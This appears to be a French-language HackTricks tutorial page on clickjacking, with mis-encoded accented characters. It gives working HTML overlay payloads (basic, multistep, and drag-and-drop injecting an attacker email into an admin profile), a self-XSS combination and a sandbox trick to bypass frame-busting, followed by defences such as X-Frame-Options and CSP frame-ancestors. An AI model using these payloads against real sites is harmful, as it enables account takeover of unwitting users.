# Clickjacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

## Qu'est-ce que le Clickjacking

Dans une attaque de clickjacking, un **utilisateur** est **tromp√©** en **cliquant** sur un **√©l√©ment** d'une page web qui est soit **invisible**, soit d√©guis√© en un autre √©l√©ment. Cette manipulation peut entra√Æner des cons√©quences inattendues pour l'utilisateur, telles que le t√©l√©chargement de logiciels malveillants, la redirection vers des pages web malveillantes, la fourniture de donn√©es d'identification ou d'informations sensibles, des transferts d'argent ou l'achat en ligne de produits.

### Astuce de pr√©remplissage de formulaires

Il est parfois possible de **remplir la valeur des champs d'un formulaire en utilisant des param√®tres GET lors du chargement d'une page**. Un attaquant peut abuser de ce comportement pour remplir un formulaire avec des donn√©es arbitraires et envoyer la charge utile de clickjacking afin que l'utilisateur appuie sur le bouton Soumettre.

### Remplir un formulaire avec Drag\&Drop

Si vous avez besoin que l'utilisateur **remplisse un formulaire** mais que vous ne voulez pas lui demander directement d'√©crire des informations sp√©cifiques (comme l'email ou un mot de passe sp√©cifique que vous connaissez), vous pouvez simplement lui demander de **Drag\&Drop** quelque chose qui √©crira vos donn√©es contr√¥l√©es comme dans [**cet exemple**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Charge utile de base
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Charge utile multistep
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Si vous avez identifi√© une **attaque XSS qui n√©cessite qu'un utilisateur clique** sur un √©l√©ment pour **d√©clencher** le XSS et que la page est **vuln√©rable au clickjacking**, vous pourriez en abuser pour tromper l'utilisateur en lui faisant cliquer sur le bouton/lien.\
Exemple :\
_Vous avez trouv√© un **self XSS** dans certains d√©tails priv√©s du compte (d√©tails que **vous seul pouvez d√©finir et lire**). La page avec le **formulaire** pour d√©finir ces d√©tails est **vuln√©rable** au **Clickjacking** et vous pouvez **pr√©remplir** le **formulaire** avec les param√®tres GET._\
\_\_Un attaquant pourrait pr√©parer une **attaque Clickjacking** sur cette page en **pr√©remplissant** le **formulaire** avec la **charge utile XSS** et en **trompant** l'**utilisateur** pour qu'il **soumette** le formulaire. Ainsi, **lorsque le formulaire est soumis** et que les valeurs sont modifi√©es, l'**utilisateur ex√©cutera le XSS**.

## Strat√©gies pour att√©nuer le Clickjacking

### D√©fenses c√¥t√© client

Les scripts ex√©cut√©s c√¥t√© client peuvent effectuer des actions pour pr√©venir le Clickjacking :

* S'assurer que la fen√™tre de l'application est la fen√™tre principale ou sup√©rieure.
* Rendre tous les cadres visibles.
* Emp√™cher les clics sur les cadres invisibles.
* D√©tecter et alerter les utilisateurs sur les tentatives potentielles de Clickjacking.

Cependant, ces scripts de contournement de cadre peuvent √™tre contourn√©s :

* **Param√®tres de s√©curit√© des navigateurs :** Certains navigateurs peuvent bloquer ces scripts en fonction de leurs param√®tres de s√©curit√© ou du manque de support JavaScript.
* **Attribut `sandbox` de l'iframe HTML5 :** Un attaquant peut neutraliser les scripts de contournement de cadre en d√©finissant l'attribut `sandbox` avec les valeurs `allow-forms` ou `allow-scripts` sans `allow-top-navigation`. Cela emp√™che l'iframe de v√©rifier si elle est la fen√™tre sup√©rieure, par exemple,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` et `allow-scripts` permettent des actions au sein de l'iframe tout en d√©sactivant la navigation de niveau sup√©rieur. Pour garantir la fonctionnalit√© pr√©vue du site cibl√©, des autorisations suppl√©mentaires comme `allow-same-origin` et `allow-modals` peuvent √™tre n√©cessaires, selon le type d'attaque. Les messages de la console du navigateur peuvent guider les autorisations √† accorder.

### D√©fenses c√¥t√© serveur

#### X-Frame-Options

L'**en-t√™te de r√©ponse HTTP `X-Frame-Options`** informe les navigateurs sur la l√©gitimit√© de rendre une page dans un `<frame>` ou `<iframe>`, aidant √† pr√©venir le Clickjacking :

* `X-Frame-Options: deny` - Aucun domaine ne peut encadrer le contenu.
* `X-Frame-Options: sameorigin` - Seul le site actuel peut encadrer le contenu.
* `X-Frame-Options: allow-from https://trusted.com` - Seule l'URI sp√©cifi√©e peut encadrer la page.
* Notez les limitations : si le navigateur ne prend pas en charge cette directive, elle peut ne pas fonctionner. Certains navigateurs pr√©f√®rent la directive CSP frame-ancestors.

#### Directive frame-ancestors de la politique de s√©curit√© du contenu (CSP)

La **directive `frame-ancestors` dans CSP** est la m√©thode conseill√©e pour la protection contre le Clickjacking :

* `frame-ancestors 'none'` - Semblable √† `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Semblable √† `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Semblable √† `X-Frame-Options: allow-from`.

Par exemple, la CSP suivante n'autorise l'encadrement que depuis le m√™me domaine :

`Content-Security-Policy: frame-ancestors 'self';`

Des d√©tails suppl√©mentaires et des exemples complexes peuvent √™tre trouv√©s dans la [documentation frame-ancestors CSP](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) et [la documentation frame-ancestors de Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Politique de s√©curit√© du contenu (CSP) avec `child-src` et `frame-src`

La **politique de s√©curit√© du contenu (CSP)** est une mesure de s√©curit√© qui aide √† pr√©venir le Clickjacking et d'autres attaques par injection de code en sp√©cifiant quelles sources le navigateur doit autoriser √† charger du contenu.

#### Directive `frame-src`

* D√©finit les sources valides pour les frames.
* Plus sp√©cifique que la directive `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Cette politique permet des cadres de la m√™me origine (soi) et https://trusted-website.com.

#### Directive `child-src`

* Introduite dans CSP niveau 2 pour d√©finir des sources valides pour les travailleurs web et les cadres.
* Agit comme une solution de secours pour frame-src et worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Cette politique permet des frames et des workers de la m√™me origine (self) et https://trusted-website.com.

**Notes d'utilisation :**

* D√©pr√©ciation : child-src est en cours de suppression au profit de frame-src et worker-src.
* Comportement de secours : Si frame-src est absent, child-src est utilis√© comme secours pour les frames. Si les deux sont absents, default-src est utilis√©.
* D√©finition stricte des sources : Inclure uniquement des sources de confiance dans les directives pour pr√©venir l'exploitation.

#### Scripts JavaScript de rupture de frame

Bien que pas compl√®tement infaillibles, les scripts de rupture de frame bas√©s sur JavaScript peuvent √™tre utilis√©s pour emp√™cher qu'une page web soit encadr√©e. Exemple :
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Utilisation des jetons Anti-CSRF

* **Validation des jetons :** Utilisez des jetons anti-CSRF dans les applications web pour garantir que les requ√™tes modifiant l'√©tat sont effectu√©es intentionnellement par l'utilisateur et non via une page Clickjacked.

## R√©f√©rences

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) pour cr√©er facilement et **automatiser des flux de travail** aliment√©s par les **outils communautaires les plus avanc√©s** au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
